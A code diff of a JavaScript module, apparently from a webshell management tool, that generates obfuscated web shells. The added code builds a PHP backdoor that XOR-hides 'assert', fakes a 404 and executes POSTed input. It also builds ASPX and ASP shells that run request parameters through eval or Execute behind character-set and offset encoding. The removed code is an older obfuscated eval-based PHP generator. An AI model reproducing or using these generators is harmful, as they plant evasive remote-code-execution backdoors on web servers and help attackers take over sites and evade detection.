@@ -6,13 +6,15 @@ class Core {
   constructor(argv) {
     let self = this;
     return new Promise((res, rej) => {
-      switch (argv.type){
+      switch (argv.type) {
         case "php":
           res(self._gen_php(argv.pwd));
           break;
         case "asp":
+          res(self._gen_asp(argv.pwd));
           break;
         case "aspx":
+          res(self._gen_aspx(argv.pwd));
           break;
         default:
           break;
@@ -21,90 +23,91 @@ class Core {
   }
 
   // 生成 php shell
-  _gen_php(pwd){
-    let self = this;
-    let rnd = self._randint(1,1000000);
-    let cmd = new Buffer(`${rnd};@evAl($_POST[${pwd}]);${rnd*3};`).toString('base64');
-    let sli = [];
-    for(var i=0; i < cmd.length/5 + 1; i++){
-      sli.push(cmd.slice(i*5,i*5+5));
+  _gen_php(pwd) {
+    let key = [0, 0, 0, 0, 0, 0].map(t => parseInt(Math.random() * 256));
+    let cipher = "assert".split("").map(t => t.charCodeAt(0)).map((t, i) => t ^ key[i]);
+    cipher = cipher.map(t => "\\x" + t.toString(16));
+    key = key.map(t => "\\x" + t.toString(16));
+    let lines = [0, 1, 2, 3, 4, 5].map((t, i) => `        $_${t} = "${cipher[i]}" ^ "${key[i]}";`).join("\r\n");
+    let name = [65, 65, 65, 65].map((t) => String.fromCharCode(parseInt(Math.random() * 26) + t)).join("");
+    let code = `<?php 
+header('HTTP/1.1 404');
+class ${name} { 
+    public $c='';
+    function __destruct() {
+${lines}
+        $db =${[0, 1, 2, 3, 4, 5].map((t, i) => `$_${t}`).join(".")};
+        return @$db($this->c);
     }
-    let tmp = [];
-    sli[4].split('').forEach((c,_,arr)=>{
-      tmp.push(self._php_encode_char(c,self._randint(1,4)));
-    });
-    sli[4] = `'.${tmp.join(".")}.'`;
-    tmp = [];
-    sli[5].split('').forEach((c,_,arr)=>{
-      tmp.push(self._php_encode_char(c,self._randint(1,4)));
-    });
-    sli[5] = `'.${tmp.join(".")}.'`;
-    cmd = sli.join("'.'");
-
-    tmp = [];
-    '$some'.split('').forEach((c,_,arr)=>{
-      tmp.push(self._php_encode_char(c,self._randint(1,4)));
-    });
-    let para = tmp.join('.');
-    tmp = [];
-    'eval($some);'.split('').forEach((c,_,arr)=>{
-      tmp.push(self._php_encode_char(c,self._randint(1,4)));
-    });
-    let func = tmp.join('.');
-    let func_name = self._randomStr(4);
-    let php_line=`<?php \$${func_name}=create_function(${para},${func});\$${func_name}(base64_decode('${cmd}'));?>`;
-    return php_line;
+}
+$${name.toLowerCase()} = new ${name}();
+@$${name.toLowerCase()}->c = $_POST['${pwd}'];
+?>`
+    return code;
   }
 
-  /*
-  * php 随机对字符进行转换
-  */
-  _php_encode_char(c, rnd){
-    let self = this;
-    rnd = rnd || 1
-    switch(rnd){
-    case 0:
-      return `'${c}'`;
-    case 1:
-      return `base64_decode('${new Buffer(c).toString('base64')}')`;
-    case 2:
-      var n = self._randint(200,1000);
-      switch(n%3){
-      case 0:
-        return `chr(${n}-${n-(c.charCodeAt())})`;
-      case 1:
-        return `chr(0x${n.toString(16)}-0x${(n-c.charCodeAt()).toString(16)})`;
-      case 2:
-        return `chr(0${n.toString(8)}-0${(n-c.charCodeAt()).toString(8)})`;
+  _gen_aspx(pwd) {
+    const randomName = () => [65, 65, 65, 65].map((t) => String.fromCharCode(parseInt(Math.random() * 26) + t)).join("");
+    const genCharSet = () => {
+      let set = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ".split("");
+      let pick = [];
+      while (set.length > 0) {
+        const idx = parseInt(Math.random() * set.length);
+        pick.push(set[idx])
+        set[idx] = set[set.length - 1];
+        set.pop();
       }
-    case 3:
-      return `str_rot13('${self._rot13(c)}')`;
-    case 4:
-      var n = self._randint(200,1000)
-      switch(n%3){
-        case 0:
-          return `chr(${n*c.charCodeAt()}/${n})`;
-        case 1:
-          return `chr(0x${(n*c.charCodeAt()).toString(16)}/0x${n.toString(16)})`;
-        case 2:
-          return `chr(0${(n*c.charCodeAt()).toString(8)}/0${n.toString(8)})`;
-      }
-    }
+      return pick;
+    };
+    const indexOf = (x) => charset.map(ch => ch.toLowerCase()).indexOf(x.toLowerCase());
+    const charset = genCharSet();
+    const charsetName = randomName();
+    const nameA = randomName();
+    const nameB = randomName();
+    return `<%@ Page Language="Jscript" Debug=true%>
+<%
+var ${charsetName}='${charset.join("")}';
+var ${nameA}=Request.Form("${pwd}");
+var ${nameB}=${"unsafe".split("").map(c => `${charsetName}(${indexOf(c)})`).join(" + ")};
+eval(${nameA}, ${nameB});
+%>`;
   }
 
-  _rot13(s){
+  _gen_asp(pwd) {
+    const randomName = () => [65, 65, 65, 65].map((t) => String.fromCharCode(parseInt(Math.random() * 26) + t)).join("");
+    //const passwd = "yzddmr6";
+    const payload = `eval request("${pwd}")`;
+    const offset = parseInt(Math.random() * 256);
+    const paramName = randomName();
+    const funcName = randomName();
+    var split = "`~-=!@#$%^&*_/+?<>{}|:[]".split("");
+    split = split[parseInt(Math.random() * split.length)];
+    return `<%
+<!--
+Function ${funcName}(${paramName}):
+	${paramName} = Split(${paramName},"${split}")
+	For x=0 To Ubound(${paramName})
+		${funcName}=${funcName}&Chr(${paramName}(x)-${offset})
+	Next
+End Function
+EXecutE(${funcName}("${payload.split("").map(chr => chr.charCodeAt(0)).map(code => code+offset).join(split)}"))
+-->
+%>`;
+  }
+
+  _rot13(s) {
     //use a Regular Expression to Replace only the characters that are a-z or A-Z
     return s.replace(/[a-zA-Z]/g, function (c) {
-        //Get the character code of the current character and add 13 to it
-        //If it is larger than z's character code then subtract 26 to support wrap around.
-        return String.fromCharCode((c <= "Z" ? 90 : 122) >= (c = c.charCodeAt(0) + 13) ? c : c - 26);
+      //Get the character code of the current character and add 13 to it
+      //If it is larger than z's character code then subtract 26 to support wrap around.
+      return String.fromCharCode((c <= "Z" ? 90 : 122) >= (c = c.charCodeAt(0) + 13) ? c : c - 26);
     });
   }
-  _randint(n, m){
-    return Math.floor(Math.random()*(m-n+1)+n);
+  _randint(n, m) {
+    return Math.floor(Math.random() * (m - n + 1) + n);
   }
   // 随机产生指定长度字符串
-  _randomStr(len){
+  _randomStr(len) {
     len = len || 8;
     let chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
     let maxPos = chars.length;
@@ -115,5 +118,5 @@ class Core {
     return pwd;
   }
 }
-  
+
 module.exports = Core;
